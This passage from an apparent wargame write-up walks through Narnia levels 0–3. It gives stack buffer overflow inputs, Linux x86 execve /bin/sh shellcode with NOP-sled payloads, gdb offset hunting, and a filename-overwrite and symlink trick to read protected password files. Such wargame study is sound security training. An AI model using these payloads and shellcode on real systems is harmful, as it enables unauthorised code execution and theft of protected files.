</span><span class='line'>                       --------------------&gt;[GOT]&lt;--
</span><span class='line'>                                   |               |
</span><span class='line'>                                   -------&gt;[libc]--</span></code></pre></td></tr></table></div></figure>
</li>
<li>A good paper to read about and from where the definition and diagram is taken is <a href="http://www.exploit-db.com/papers/13203/">How to Hijack the Global Offset Table with pointers</a></li>
</ul>
</li>

</ul>
</li>
</ol>


<h3>Buffer Overflow Examples</h3>

<ol>
<li>
Let's see a simple example of binary exploitation <strong>Narnia0</strong> where we have to write a written value.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="kt">long</span> <span class="n">val</span><span class="o">=</span><span class="mh">0x41414141</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Here is your chance: &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%24s&quot;</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;val: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">val</span><span class="o">==</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;WAY OFF!!!!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 "A" and the address it won't work as the val doesn't matches. So, we have to use python print command.
If we use 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
</span></code></pre></td></tr></table></div></figure>
</li>


<li>In another example below <strong>Narnia1</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(){</span>
</span><span class='line'>  <span class="nb">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">)</span><span class="o">==</span><span class="n">NULL</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Give me something to execute at the env-variable EGG</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Trying to execute EGG!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;EGG&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">ret</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
We need to set a environment variable EGG with an shellcode. Previously, I tried with
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\b</span><span class="s">in\sh&quot;</span>
</span><span class='line'><span class="ow">and</span>
</span><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><span class="s">&quot;</span>
</span></code></pre></td></tr></table></div></figure>
Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that
if I write
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\xCC&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
It should sigtrap. "\xCC" acts as a software breakpoint, basically an INT3,  It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you're good to go, and it's a good way to make sure you've properly redirected execution to your shellcode. You can further put "\xCC" anywhere in the shellcode, if it crashes before "\xCC", you know for sure that your shellcode has bad characters.
They suggested to export the EGG variable as
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`</span>
</span></code></pre></td></tr></table></div></figure>
and it worked like a charm.
</li>

<li>
In another example <strong>Narnia2</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="c">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'>  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: </span><span class="si">%s</span><span class="s"> argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
It's to easy that buffer overflow vulnerability exists because of strcpy. Let's see what is the offset for this.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ulimit -c unlimited
</span><span class='line'>./narnia2 `/usr/share/metasploit-framework/tools/pattern_create.rb 200`
</span><span class='line'>Segmentation fault (core dumped)
</span><span class='line'>
</span><span class='line'>gdb -q -c core ./narnia2
</span><span class='line'>#0  0x37654136 in ?? ()
</span><span class='line'>
</span><span class='line'>/usr/share/metasploit-framework/tools/pattern_offset.rb 0x37654136
</span><span class='line'>[*] Exact match at offset 140
</span><span class='line'>narnia2@melinda:~$ gdb -q /narnia/narnia2
</span><span class='line'>(gdb) disassemble main 
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>**Snip**
</span><span class='line'>   0x080484a0 &lt;+67&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x080484a3 &lt;+70&gt;:    call   0x8048320 &lt;strcpy@plt&gt;
</span><span class='line'>**Snip**
</span><span class='line'>End of assembler dump.
</span><span class='line'>(gdb) br *main+70
</span><span class='line'>Breakpoint 1 at 0x80484a3
</span><span class='line'>(gdb) run `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>Starting program: /games/narnia/narnia2 `python -c 'print "A"*140 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a3 in main ()
</span><span class='line'>(gdb) n
</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>
Let's see the stack after the strcpy, which would tell us the probable address we want to redirect execution.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/80xw $esp+400
</span><span class='line'>0xffffd7e0:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f0:   0x00000000  0x00000000  0x1d000000  0xa9c79d1b
</span><span class='line'>0xffffd800:   0xe1a67367  0xc19fc850  0x6996cde4  0x00363836
</span><span class='line'>0xffffd810:   0x2f000000  0x656d6167  0x616e2f73  0x61696e72
</span><span class='line'>0xffffd820:   0x72616e2f  0x3261696e  0x41414100  0x41414141
</span><span class='line'>0xffffd830:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd840:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd850:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd860:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd870:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd880:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd890:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x41414141  0x42424241  0x44580042  0x45535f47
</span><span class='line'>0xffffd8c0:   0x4f495353  0x44495f4e  0x3939383d  0x53003733</span></code></pre></td></tr></table></div></figure>
Let pick a shellcode from shellstorm for a Linux x86 execuve /bin/sh and calculate the number of NOPs
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia2@melinda:~$ python -c 'print len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'
</span><span class='line'>23
</span><span class='line'>narnia2@melinda:~$ bc    
</span><span class='line'>140-23
</span><span class='line'>117
</span><span class='line'>narnia2@melinda:~$ /narnia/narnia2 `python -c 'print "\x90"*117 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x50\xd8\xff\xff"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia3
</span><span class='line'>**********
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>


<li>
In another example <strong>Narnia3</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt; </span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>        <span class="kt">int</span>  <span class="n">ifd</span><span class="p">,</span>  <span class="n">ofd</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ofile</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="s">&quot;/dev/null&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">ifile</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage, %s file, will send contents of file 2 /dev/null</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* open files */</span>
</span><span class='line'>        <span class="n">strcpy</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ofd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ofile</span><span class="p">,</span><span class="n">O_RDWR</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">if</span><span class="p">((</span><span class="n">ifd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">ifile</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">){</span>
</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;error opening %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ifile</span><span class="p">);</span>
</span><span class='line'>                <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* copy from file1 to file2 */</span>
</span><span class='line'>        <span class="n">read</span><span class="p">(</span><span class="n">ifd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">write</span><span class="p">(</span><span class="n">ofd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;copied contents of %s to a safer place... (%s)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">ifile</span><span class="p">,</span><span class="n">ofile</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="cm">/* close &#39;em */</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ifd</span><span class="p">);</span>
</span><span class='line'>        <span class="n">close</span><span class="p">(</span><span class="n">ofd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Superkojiman notes explain this best, copied here with permission, thanks superkojiman :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia3@melissa:/narnia$ ./narnia3 /etc/motd
</span><span class='line'>copied contents of /etc/motd to a safer place... (/dev/null)</span></code></pre></td></tr></table></div></figure>
We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. 

We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here's what the stack looks like:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+---------+
</span><span class='line'>|  ret    |
</span><span class='line'>|  sfp    |
</span><span class='line'>|  ofd    |
</span><span class='line'>|  ifd    |
</span><span class='line'>|  ofile  |
</span><span class='line'>|  ifile  |
</span><span class='line'>|  buf    |
</span><span class='line'>+---------+ &lt;- esp</span></code></pre></td></tr></table></div></figure>
ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3
</span><span class='line'># gdb -q narnia3
</span><span class='line'>
</span><span class='line'>If we disas main, we can see that strcpy is called at *main+100:
</span><span class='line'>
</span><span class='line'>   0x08048551 &lt;+93&gt;:    lea    0x38(%esp),%eax
</span><span class='line'>   0x08048555 &lt;+97&gt;:    mov    %eax,(%esp)
</span><span class='line'>   0x08048558 &lt;+100&gt;:   call   0x8048400 &lt;strcpy@plt&gt;
</span><span class='line'>   0x0804855d &lt;+105&gt;:   movl   $0x2,0x4(%esp)
</span><span class='line'>   0x08048565 &lt;+113&gt;:   lea    0x58(%esp),%eax
</span><span class='line'>   0x08048569 &lt;+117&gt;:   mov    %eax,(%esp)
</span><span class='line'>
</span><span class='line'>We set a breakpoint there and run the program with the following arguments:
</span><span class='line'>
</span><span class='line'>(gdb) r `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>Starting program: /root/wargames/narnia/3/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
</span><span class='line'>37            strcpy(ifile, argv[1]);
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>At the first breakpoint, we examine the local variables
</span><span class='line'>
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/dev/null\000\000\000\000\000\000"
</span><span class='line'>ifile = "x\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b$\243\374\267\364\237", &lt;incomplete sequence \374\267&gt;
</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>ofile is set to /dev/null as expected. We'll step to the next instruction and check again.
</span><span class='line'>
</span><span class='line'>(gdb) s
</span><span class='line'>38            if((ofd = open(ofile,O_RDWR)) &lt; 0 ){
</span><span class='line'>(gdb) i locals
</span><span class='line'>ifd = 134514299
</span><span class='line'>ofd = -1208180748
</span><span class='line'>ofile = "/tmp/hack\000\000\000\000\000\000"
</span><span class='line'>ifile = 'A' &lt;repeats 32 times&gt;
</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>As expected, ofile has been overwritten to /tmp/hack. However ifile is now AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack so in order to read /etc/narnia_pass/narnia4, we need to create a directory AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp and symlink /etc/narnia_pass/narnia4 to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>Next we need to create the output file /tmp/hack that ofile points to
</span><span class='line'>
